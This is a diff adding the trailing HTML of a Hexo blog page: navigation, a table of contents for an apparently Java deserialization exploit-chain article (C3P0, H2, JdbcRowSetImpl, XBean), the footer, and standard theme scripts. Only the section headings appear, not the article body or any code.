+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="nav-number">2.</span> <span class="nav-text">不出网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK%E5%8E%9F%E7%94%9F"><span class="nav-number">2.1.</span> <span class="nav-text">JDK原生</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="nav-number">2.1.1.</span> <span class="nav-text">简要分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">2.1.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MarshalOutputStream%E5%86%99Jar%E5%8C%85-SPI"><span class="nav-number">2.2.</span> <span class="nav-text">MarshalOutputStream写Jar包+SPI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">简要分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Marshal-ClassPathXmlApplicationContext"><span class="nav-number">2.3.</span> <span class="nav-text">Marshal+ClassPathXmlApplicationContext</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.3.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">简要分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#H2"><span class="nav-number">2.4.</span> <span class="nav-text">H2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.4.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">简要分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C3P0%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.5.</span> <span class="nav-text">C3P0二次反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">2.5.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BA%E7%BD%91"><span class="nav-number">3.</span> <span class="nav-text">出网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-number">3.1.</span> <span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dns"><span class="nav-number">3.3.</span> <span class="nav-text">Dns</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpiLoadJar"><span class="nav-number">3.4.</span> <span class="nav-text">SpiLoadJar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleJndiBeanFactory"><span class="nav-number">3.5.</span> <span class="nav-text">SimpleJndiBeanFactory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C3p0Jndi"><span class="nav-number">3.6.</span> <span class="nav-text">C3p0Jndi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">3.6.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XBean"><span class="nav-number">3.7.</span> <span class="nav-text">XBean</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-number">3.7.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Commons-Configuration"><span class="nav-number">3.8.</span> <span class="nav-text">Commons-Configuration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-number">3.8.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.9.</span> <span class="nav-text">依赖探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-6"><span class="nav-number">3.9.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-2"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">45.1k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="nav-number">2.</span> <span class="nav-text">不出网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK%E5%8E%9F%E7%94%9F"><span class="nav-number">2.1.</span> <span class="nav-text">JDK原生</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="nav-number">2.1.1.</span> <span class="nav-text">简要分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">2.1.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MarshalOutputStream%E5%86%99Jar%E5%8C%85-SPI"><span class="nav-number">2.2.</span> <span class="nav-text">MarshalOutputStream写Jar包+SPI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">简要分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Marshal-ClassPathXmlApplicationContext"><span class="nav-number">2.3.</span> <span class="nav-text">Marshal+ClassPathXmlApplicationContext</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.3.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">简要分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#H2"><span class="nav-number">2.4.</span> <span class="nav-text">H2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.4.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">简要分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C3P0%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.5.</span> <span class="nav-text">C3P0二次反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">2.5.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BA%E7%BD%91"><span class="nav-number">3.</span> <span class="nav-text">出网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-number">3.1.</span> <span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dns"><span class="nav-number">3.3.</span> <span class="nav-text">Dns</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SpiLoadJar"><span class="nav-number">3.4.</span> <span class="nav-text">SpiLoadJar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SimpleJndiBeanFactory"><span class="nav-number">3.5.</span> <span class="nav-text">SimpleJndiBeanFactory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C3p0Jndi"><span class="nav-number">3.6.</span> <span class="nav-text">C3p0Jndi</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">3.6.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XBean"><span class="nav-number">3.7.</span> <span class="nav-text">XBean</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-number">3.7.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Commons-Configuration"><span class="nav-number">3.8.</span> <span class="nav-text">Commons-Configuration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-number">3.8.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%9D%E8%B5%96%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.9.</span> <span class="nav-text">依赖探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-6"><span class="nav-number">3.9.1.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-2"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
